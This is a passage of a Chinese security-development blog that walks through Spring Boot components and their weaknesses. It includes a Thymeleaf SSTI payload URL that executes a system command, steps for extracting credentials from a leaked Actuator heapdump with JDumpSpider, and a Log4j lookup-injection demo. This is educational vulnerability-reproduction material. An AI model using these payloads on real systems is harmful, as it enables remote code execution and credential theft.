class="built_in">this</span>.password = password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&quot;, username=&#x27;&quot;</span> + username + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;, password=&#x27;&quot;</span> + password + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建-Mapper-动态接口代理类实现"><a href="#创建-Mapper-动态接口代理类实现" class="headerlink" title="创建 Mapper 动态接口代理类实现"></a>创建 Mapper 动态接口代理类实现</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105221317249.png" alt="image-20250105221317249"></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.attackxu.springbootmybatils.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.attackxu.springbootmybatils.entity.User;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Mapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.ibatis.annotations.Select;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Mapper</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">UserMapper</span> &#123;</span><br><span class="line">    <span class="meta">@Select(&quot;select * from admin&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findAll</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Select(&quot;select * from admin where id=1&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">findID</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="创建-Controller-实现-Web-访问调用"><a href="#创建-Controller-实现-Web-访问调用" class="headerlink" title="创建 Controller 实现 Web 访问调用"></a>创建 Controller 实现 Web 访问调用</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> cn.attackxu.springbootmybatils.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.attackxu.springbootmybatils.entity.User;</span><br><span class="line"><span class="keyword">import</span> cn.attackxu.springbootmybatils.mapper.UserMapper;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">GetadminController</span> &#123;</span><br><span class="line">    <span class="comment">//调用UserMapper</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper UserMapper;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//路由地址</span></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/getadmin&quot;)</span></span><br><span class="line">    <span class="comment">//方法类型要和返回值类型对应List&lt;User&gt;</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getadmindata</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; all= UserMapper.findAll();<span class="comment">//引入局部变量接收UserMapper.findAll()的值，并回显到页面</span></span><br><span class="line">        <span class="keyword">return</span> all;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/getid&quot;)</span></span><br><span class="line">    <span class="comment">//方法类型要和返回值类型对应List&lt;User&gt;</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;User&gt; <span class="title function_">getadminid</span><span class="params">()</span>&#123;</span><br><span class="line">        List&lt;User&gt; all= UserMapper.findID();<span class="comment">//引入局部变量接收UserMapper.findAll()的值，并回显到页面</span></span><br><span class="line">        <span class="keyword">return</span> all;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="查询实现"><a href="#查询实现" class="headerlink" title="查询实现"></a>查询实现</h2><p>配置完成后，浏览器访问&#x2F;getadmin，触发getadmindata()方法，回显查询结果，与数据库一致</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105224551255.png" alt="image-20250105224551255"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105224601066.png" alt="image-20250105224601066"></p><p>访问&#x2F;getid</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105224648085.png" alt="image-20250105224648085"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105224658514.png" alt="image-20250105224658514"></p><h2 id="安全问题-mybatis-sql语句注入风险"><a href="#安全问题-mybatis-sql语句注入风险" class="headerlink" title="安全问题-mybatis sql语句注入风险"></a>安全问题-mybatis sql语句注入风险</h2><p>#和$符号</p><p>三种可注入情况</p><h1 id="模版引擎-Thymeleaf"><a href="#模版引擎-Thymeleaf" class="headerlink" title="模版引擎-Thymeleaf"></a>模版引擎-Thymeleaf</h1><p>不安全的模版版本<br>日常开发中：语言切换页面，主题更换等传参导致的 SSTI 注入安全问题<br>漏洞参考：<a href="https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg">https://mp.weixin.qq.com/s/NueP4ohS2vSeRCdx4A7yOg</a></p><h2 id="创建项目-2"><a href="#创建项目-2" class="headerlink" title="创建项目"></a>创建项目</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105230907878.png" alt="image-20250105230907878"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105230936032.png" alt="image-20250105230936032"></p><p>使用模板渲染，必须在resources目录下创建templates存放html文件</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250105231140653.png" alt="image-20250105231140653"></p><p>遇到问题：路径访问并没有从模板渲染，而是当成字符串显示操作</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/1a774f59398fbb76283c566eed34229b.png" alt="img"></p><p>原因：@RestController包含了 @ResponseBody 和 @Controller 的功能。@ResponseBody index当做字符串显示操作</p><p>解决方式：更换为@Controller 没有ResponseBody index当做资源文件去渲染</p><h2 id="安全问题"><a href="#安全问题" class="headerlink" title="安全问题"></a>安全问题</h2><p>日常开发中：语言切换页面，主题更换等传参导致的SSTI注入安全问题</p><p>案例：</p><p>例如：更换中英文页面模板</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/30680584d165b4ed213d77d326e9591d.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/a6353a28774f28914e7971242c25c100.png" alt="img"></p><p>启动项目，并输入对应路由访问，指向渲染文件的文件名</p><p>注入为：</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:8080/?lang=%7bnew java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(&quot;calc&quot;).getInputStream()).next()%7d__::.x](http://127.0.0.1:8080/?lang=__%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc%22).getInputStream()).next()%7d::.x)</span><br></pre></td></tr></table></figure><p>控制传入参数可以导致RCE</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/a607ab831e4052571c696b13d95ae478.png" alt="img"></p><h1 id="监控系统-Actuator"><a href="#监控系统-Actuator" class="headerlink" title="监控系统-Actuator"></a>监控系统-Actuator</h1><h2 id="介绍-1"><a href="#介绍-1" class="headerlink" title="介绍"></a>介绍</h2><p>SpringBoot Actuator 模块提供了生产级别的功能，比如健康检查，审计，指标收集，HTTP 跟踪等，帮助我们监控和管理 Spring Boot 应用。</p><p>Actuator断点图</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115102143915.png" alt="image-20250115102143915"></p><h2 id="创建项目-3"><a href="#创建项目-3" class="headerlink" title="创建项目"></a>创建项目</h2><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115094320241.png" alt="image-20250115094320241"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115094412891.png" alt="image-20250115094412891"></p><p>服务端</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115095400512.png" alt="image-20250115095400512"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115095432928.png" alt="image-20250115095432928"></p><p>客户端</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115095611870.png" alt="image-20250115095611870"></p><p>配置监控</p><p>application.properties：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># 这个配置项是用于指定要暴露的web端点。*表示暴露所有端点。</span><br><span class="line">management.endpoints.web.exposure.include=*</span><br><span class="line"># 这个配置项用于指定是否显示健康检查的详细信息。always表示总是显示详细信息。</span><br><span class="line">management.endpoint.health.show-details=always</span><br></pre></td></tr></table></figure><h2 id="安全问题-1"><a href="#安全问题-1" class="headerlink" title="安全问题"></a>安全问题</h2><p>当我们访问路由，会泄露敏感信息</p><p><img src="C:/Users/%E9%9F%A9%E6%97%AD/AppData/Roaming/Typora/typora-user-images/image-20250115102343005.png" alt="image-20250115102343005"></p><p>安全配置：<br>在 application.properties 进行如下配置，关闭某些端点的启用，防止敏感信息泄露<br>从这里也可以看出来，&#x2F;actuator&#x2F;env 和 &#x2F;actuator&#x2F;heapdump 这两个目录下爆出来信息是很敏感</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">management.endpoint.env.enabled=false</span><br><span class="line">management.endpoint.heapdump.enabled=false</span><br></pre></td></tr></table></figure><p>再次尝试访问&#x2F;actuator&#x2F;env，&#x2F;actuator&#x2F;heapdump就会访问失败</p><h3 id="heapdump泄露"><a href="#heapdump泄露" class="headerlink" title="heapdump泄露"></a>heapdump泄露</h3><p>通过访问得到相应的heapdump包，可以用工具进行分析，取到配置信息（分析提取出敏感信息（配置帐号密码，接口信息 数据库 短信 云应用等配置）</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115102743300.png" alt="image-20250115102743300"></p><p>访问路径下载文件</p><p>工具：JDumpSpider提取器</p><p>可以帮助我们自动化从中提取敏感信息，里面包含类信息，可以直接到很多配置信息</p><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump文件</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3228569439d17a63e8d7a939fbdd0297.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/441fe8b1f21811d7f4d54ca4f158453e.png" alt="img"></p><p>还可以使用jdk自带工具进行分析（需要手动分析，一般不适用，而且要掌握查询语法）</p><p>工具：jvisualvm分析器</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/2b793a0d1845f5c54ea868ba68d9359c.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/e560c96e71acd7729008d0d8b00fa77c.png" alt="img"></p><p>其他安全问题：<a href="https://blog.csdn.net/drnrrwfs/article/details/125242990">https://blog.csdn.net/drnrrwfs/article/details/125242990</a></p><p>还可以分析得到使用一些组件，去尝试组件的安全问题</p><h1 id="接口系统-Swagger"><a href="#接口系统-Swagger" class="headerlink" title="接口系统-Swagger"></a>接口系统-Swagger</h1><h2 id="介绍-2"><a href="#介绍-2" class="headerlink" title="介绍"></a>介绍</h2><p>Swagger 是当下比较流行的实时接口文文档生成工具。接口文档是当前前后端分离项目中必不可少的工具，在前后端开发之前，后端要先出接口文档，前端根据接口文档来进行项目的开发，双方开发结束后在进行联调测试。</p><p>参考：<a href="https://blog.csdn.net/lsqingfeng/article/details/123678701">https://blog.csdn.net/lsqingfeng/article/details/123678701</a></p><h2 id="2版本和3版本差异"><a href="#2版本和3版本差异" class="headerlink" title="2版本和3版本差异"></a>2版本和3版本差异</h2><p>application.properties</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"># 应用服务 WEB 访问端口</span><br><span class="line">server.port=<span class="number">8002</span></span><br><span class="line"># 设置路径匹配策略为Ant路径匹配器</span><br><span class="line">spring.mvc.pathmatch.matching-strategy=ant_path_matcher</span><br></pre></td></tr></table></figure><p>2.9.2</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;springfox-swagger2&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;<span class="number">2.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br><span class="line"> &lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;springfox-swagger-ui&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;<span class="number">2.9</span><span class="number">.2</span>&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>3.0.0</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">     &lt;groupId&gt;io.springfox&lt;/groupId&gt;</span><br><span class="line">     &lt;artifactId&gt;springfox-boot-starter&lt;/artifactId&gt;</span><br><span class="line">     &lt;version&gt;<span class="number">3.0</span><span class="number">.0</span>&lt;/version&gt;</span><br><span class="line"> &lt;/dependency&gt;</span><br></pre></td></tr></table></figure><blockquote><p>2.X 版本启动需要在启动文件添加注释 @EnableSwagger2<br>3.X 版本不需注释，写的话是 @EnableOpenApi</p><p>2.X 访问路径：<a href="http://ip:port/swagger-ui.html">http://ip:port/swagger-ui.html</a><br>3.X 访问路径：<a href="http://ip:port/swagger-ui/index.html">http://ip:port/swagger-ui/index.html</a></p></blockquote><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/d68192a9552068bc2656eabb2e77a07a.png" alt="img"></p><h2 id="安全问题-2"><a href="#安全问题-2" class="headerlink" title="安全问题"></a>安全问题</h2><p>自动化测试：Postman<br>泄漏应用接口：用户登录，信息显示，上传文件等<br>可用于对未授权访问，信息泄漏，文件上传等安全漏洞的测试</p><p>打开postman打开工作台，在左侧找到API</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/2d7b1fed0a53bd2a9fb0c619d4fd1bfe.png" alt="img"></p><p>打开API导入生成的swagger页面提供的API：<a href="http://127.0.0.1:8080/v3/api-docs">http://127.0.0.1:8080/v3/api-docs</a></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/0793f567a5c0ea13d306782d1dd8617a.png" alt="img"></p><p>导入成功后点击Api Documentation，点击右侧的运行，勾选想要测试的接口，执行即可</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/d535a8b40f8b73daabf4a2bc6b315ab5.png" alt="img"></p><p>也可以批量化测试</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/adda4ca6c1c568e6dc17a5fa1eedd356.png" alt="img"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/54d83dac794968e5f9c4007223a7a781.png" alt="img"></p><h1 id="身份鉴权-JWT技术"><a href="#身份鉴权-JWT技术" class="headerlink" title="身份鉴权-JWT技术"></a>身份鉴权-JWT技术</h1><h2 id="介绍-3"><a href="#介绍-3" class="headerlink" title="介绍"></a>介绍</h2><p>JWT ( JSON  Web Token ) 是由服务端用加密算法对信息签名来保证其完整性和不可伪造；<br>Token里可以包含所有必要信息，这样服务端就无需保存任何关于用户或会话的信息；<br>JWT用于身份认证、会话维持等。由三部分组成，header、payload与signature。</p><p><a href="https://developer.aliyun.com/article/995894">https://developer.aliyun.com/article/995894</a></p><p>JWT格式：</p><p>在其紧凑的形式中，JWT由以点(.)分隔的三个部分组成，它们是:</p><ul><li>Header</li><li>Payload</li><li>Signature</li></ul><p>类似：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c</span><br></pre></td></tr></table></figure><blockquote><p>Cookie、Session、JWT来实现身份验证</p><p>Cookie存储在浏览器<br>Session存储在服务器<br>JWT存储在浏览器</p></blockquote><p>版本不兼容</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115114652112.png" alt="image-20250115114652112"></p><p>解决方式：</p><ol><li>更换jwt低版本</li><li>更换jdk高版本</li></ol><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115114858093.png" alt="image-20250115114858093"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwYXNzd29yZCI6IjEyMzQ1NiIsInVzZXJpZCI6MSwidXNlcm5hbWUiOiJhZG1pbiJ9.vbGmm09EQAjp5Lfk16wjnRtf0pw9OS_dZCWQPWzL-8w</span><br></pre></td></tr></table></figure><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115115024905.png" alt="image-20250115115024905"></p><p>如果我们直接修改payload，但是没有加上密钥，生成的jwt结果发送后会导致服务器接收后解密错误（没有密钥）所以无法直接进行修改jwt的payload部分来进行身份篡改（jwt中Signature部分就是为了防篡改）</p><h2 id="为什么说jwt是安全的？"><a href="#为什么说jwt是安全的？" class="headerlink" title="为什么说jwt是安全的？"></a>为什么说jwt是安全的？</h2><p>因为token解密加密需要密钥，密钥都保存在服务端里。你可以轻易伪造出用户信息但是得不到密钥，就无法通过服务端token解密，鉴权失败。<br>所以很多开发者往往是密文能被解密，就认定通过。</p><h2 id="安全问题-3"><a href="#安全问题-3" class="headerlink" title="安全问题"></a>安全问题</h2><p><a href="https://saucer-man.com/information_security/377.html">https://saucer-man.com/information_security/377.html</a></p><h1 id="打包部署-JAR-WAR"><a href="#打包部署-JAR-WAR" class="headerlink" title="打包部署-JAR&amp;WAR"></a>打包部署-JAR&amp;WAR</h1><p>参考：<a href="https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg">https://mp.weixin.qq.com/s/HyqVt7EMFcuKXfiejtfleg</a></p><p>可以用7-zip打开生成的jar包</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115140752224.png" alt="image-20250115140752224"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250115141016600.png" alt="image-20250115141016600"></p><p>无源码下载泄漏风险：网站应用是运行jar的形式，类似exe客户端</p><p>没有泄露的风险<br>源码泄漏也需反编译</p><h2 id="得到jar包-反编译"><a href="#得到jar包-反编译" class="headerlink" title="得到jar包-反编译"></a>得到jar包-反编译</h2><p>最简单的 jar 包反编译方法：解压缩直接将 jar 包解压出来后使用 IDEA 直接打开项目，会自动反编译得到源码，不过项目里面的注释会消失。</p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Maven</title>
      <link href="/2025/05/27/Maven/"/>
      <url>/2025/05/27/Maven/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>是一个基于项目对象模型（POM）的强大项目管理工具，它主要服务于 Java 平台的自动化构建。Maven 不仅提供了包管理的功能，还通过其丰富的插件支持了项目的开发、打包、测试和部署等一系列过程。</p><p>传统工程我们直按把jar包放置在项目中， Maven工程真正的jar包放置在仓库中，项目中只用放置jar包的坐标。不使用Maven工具，当做 Java 项目需要第三方依赖包时，将别人打好的 Jar 包下载到本地，然后手动指定给项目。另外，比如版本控制，需要新版本怎么办，重新下载，重新指定，这个过程操作麻烦。而用了 Maven 之后，需要什么包，直接在 pom.xml 中添加几行 xml 代码（添加所依赖jar包的坐标），指定包名、版本等，就可以了，方便开发。</p><h1 id="moven下载配置"><a href="#moven下载配置" class="headerlink" title="moven下载配置"></a>moven下载配置</h1><p>Maven下载配置教程：<a href="https://www.jb51.net/article/259780.htm#_label0">https://www.jb51.net/article/259780.htm#_label0</a></p><p>jar仓库：<a href="https://mvnrepository.com/">https://mvnrepository.com/</a></p><h1 id="Maven-引用-Log4j"><a href="#Maven-引用-Log4j" class="headerlink" title="Maven 引用 Log4j"></a>Maven 引用 Log4j</h1><h2 id="引用过程"><a href="#引用过程" class="headerlink" title="引用过程"></a>引用过程</h2><p>在 pom.xml 文件中添加引用<br>引用代码是那个 Jar 仓库搜索到之后复制 Maven 的代码</p><blockquote><p>这里引用的是 2.14.1 版本的</p></blockquote><p>创建项目</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103215703046.png" alt="image-20250103215703046"></p><p>引用maven的log4j代码</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103214856941.png" alt="image-20250103214856941"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103214929828.png" alt="image-20250103214929828"></p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103214943055.png" alt="image-20250103214943055"></p><p>将此处内容复制粘贴到pom.xml文件中，写入<code>&lt;dependencies&gt; &lt;/dependencies&gt;</code>标签中</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103215456152.png"></p><p>之后在库中就可以看到</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103215525069.png" alt="image-20250103215525069"></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Log4j</title>
      <link href="/2025/05/27/Log4j/"/>
      <url>/2025/05/27/Log4j/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Apache的一个开源项目，通过使用Log4j，我们可以控制日志信息输送的目的地是控制台、文件、GUI组件，甚至是套接口服务器、NT的事件记录器、UNIX Syslog守护进程等；我们也可以控制每一条日志的输出格式；通过定义每一条日志信息的级别，我们能够更加细致地控制日志的生成过程。最令人感兴趣的就是，这些可以通过一个配置文件来灵活地进行配置，而不需要修改应用的代码。</p><p>Log4j-组件安全复现</p><ol><li>创建Maven并命名为Log4jDemo</li><li>找到对应版本Apache Log4j Core » 2.14.1，并导入至项目中pom.xml文件中</li><li>并刷新Maven则导入成功</li><li>在java下创建Log4jTest.java 文件,导入引入的第三方Log4j相关包</li><li>Log4j 使用： 代码使用 Log4j 2.x 提供的日志功能，通过 LogManager.getLogger 获取一个 Logger 实例，然后使用 Logger.error 记录错误日志。</li><li>在 Logger.error(“{}”, code); 中，code 的值是 <code>$&#123;java:os&#125;</code>。这是 Log4j 的变量替换语法，其中 <code>$&#123;java:os&#125;</code> 表示执行 Java 系统属性（在这里是执行系统命令）。如果 code 的值是由用户提供的，那么存在潜在的安全风险，因为用户可以通过输入特定的内容来执行恶意代码。</li></ol><h1 id="测试log4j"><a href="#测试log4j" class="headerlink" title="测试log4j"></a>测试log4j</h1><p>创建 Log4jTest.java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Log4jTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//使用Log4j 实现错误日志输出</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger(Log4jTest.class);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//如果这个code变量是可控的</span></span><br><span class="line">        String code=<span class="string">&quot;$&#123;java:os&#125;&quot;</span>;</span><br><span class="line">        logger.error(<span class="string">&quot;&#123;&#125;&quot;</span>,code);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后发现log4j将code参数中的内容当作命令执行</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103220328549.png" alt="image-20250103220328549"></p>]]></content>
      
      
      <categories>
          
          <category> 安全开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JAVA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JNDI</title>
      <link href="/2025/05/27/JNDI/"/>
      <url>/2025/05/27/JNDI/</url>
      
        <content type="html"><![CDATA[<p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/5883b3ae9bcaeb3cfe1bd861030e360e.png" alt="img"></p><h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>Java Naming and Directory Interface (Java 命名和目录接口 )，JNDI 提供统一的客户端 API，通过不同的服务供应接口(SPI)的实现，由管理者将 JNDI API 映射为特定的命名服务和目录服务，使得 JAVA 应用程可以通过 JNDI 实现和这些命名服务和目录服务之间的交互。</p><p><img src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20250103232014923.png"></p><p>JNDI是一个接口，在这个接口下会有多种目录系统服务的实现，通过名称等去找到相关的对象，并把它下载到客户端中来。用于在分布式环境中查找和访问命名和目录服务。它允许Java应用程序通过名称引用资源，如数据库连接、远程对象等。</p><p>反序列化常用的两种利用方式，一种是基于RMI，一种是基于ldap。</p><p>RMI：远程方法调用注册表<br>LDAP：轻量级目录访问协议</p><p>调用检索：<br>Java为了将Object对象存储在Naming或Directory服务下，提供了Naming Reference功能，对象可以通过绑定Reference存储在Naming或Directory服务下，比如RMI、LDAP等。javax.naming.InitialContext.lookup()</p><p>lookup()：通过名字检索执行的对象</p><p>在RMI服务中调用了InitialContext.lookup()的类有：</p><ul><li>org.springframework.transaction.jta.JtaTransactionManager.readObject()</li><li>com.sun.rowset.JdbcRowSetImpl.execute()</li><li>javax.management.remote.rmi.RMIConnector.connect()</li><li>org.hibernate.jmx.StatisticsService.setSessionFactoryJNDIName(String sfJNDIName)</li></ul><p>在LDAP服务中调用了InitialContext.lookup()的类有：</p><ul><li>InitialDirContext.lookup()</li><li>Spring LdapTemplate.lookup()</li><li>LdapTemplate.lookupContext()</li></ul><h1 id="RMI"><a href="#RMI" class="headerlink" title="RMI"></a>RMI</h1><p>RMI（Remote Method Invocation，远程方法调用）是一种用于在分布式系统中实现远程通信和方法调用的Java API。</p><p>RMI 允许在不同的 Java 虚拟机（JVM）上的对象之间进行通信和交互。通过 RMI，客户端可以调用远程服务器上的对象的方法，就像调用本地对象的方法一样。</p><p>RMI 的工作原理如下：</p><ol><li>客户端通过命名服务（如 RMI Registry）查找到要调用的远程对象的引用。</li><li>客户端通过远程对象的引用进行远程方法的调用。</li><li>远程对象在服务器端接收到方法调用请求后执行相应的方法。</li><li>执行完方法后，远程对象将返回相应的结果给客户端。</li></ol><blockquote><p>需要注意的是，RMI 是基于 Java 的，并且只能在 Java 环境下使用。它依赖于 Java 的序列化机制来将对象转换为字节序列进行传输。</p></blockquote><h1 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h1><p>LDAP（Lightweight Directory Access Protocol，轻量级目录访问协议）是一种用于访问和操作分布式目录服务的协议。</p><p>LDAP 最初设计用于访问 X.500 目录服务，但随着时间的推移，它也被广泛应用于其他目录服务，如Microsoft Active Directory和OpenLDAP等。</p><p>目录服务是一种用于存储和组织大量结构化数据的数据库系统，通常用于存储用户、组织、网络资源等的信息。LDAP 提供了一种标准化的方式来查询、添加、修改和删除目录中的数据。</p><p>LDAP 的工作原理如下：</p><ol><li>客户端通过 LDAP 协议与目录服务器建立连接。</li><li>客户端发送查询请求（如搜索、添加、修改等）到目录服务器。</li><li>目录服务器根据请求进行相应的操作，并将结果返回给客户端。</li><li>客户端接收并处理服务器返回的结果。</li></ol><p>LDAP 使用基于文本的协议进行通信，通常在 TCP&#x2F;IP 上运行，默认端口号为389。它采用层次化的数据结构（树状结构）来组织数据，每个节点都有一个唯一的标识符（DN，Distinguished Name）。</p><p>LDAP 